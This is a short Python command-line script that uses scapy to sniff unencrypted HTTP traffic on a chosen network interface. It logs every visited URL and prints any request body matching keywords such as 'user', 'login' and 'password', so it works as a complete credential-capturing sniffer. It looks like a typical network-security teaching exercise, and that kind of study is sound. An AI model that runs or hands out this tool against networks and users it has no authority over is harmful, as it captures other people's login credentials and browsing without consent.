#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import re
import argparse

def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet, )


def get_url(packet):
    return packet[http.HTTPRequest].Host.decode('utf-8') + \
           packet[http.HTTPRequest].Path.decode('utf-8')


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(" [+] Visited URL:", "http://" + url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            load_str = load.decode('utf-8')  # Decode bytes to string
            # Use regular expression to search for sensitive information
            if re.search(r'uname|username|user|login|register|user_id|u_name|usr|usr_name|pas|pass|password', load_str, re.IGNORECASE):
                print(" [+] Sensitive Data:", load_str)


def main():
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Interface to sniff packets on.")
    args = parser.parse_args()

    sniff(args.interface)


if __name__ == "__main__":
    main()
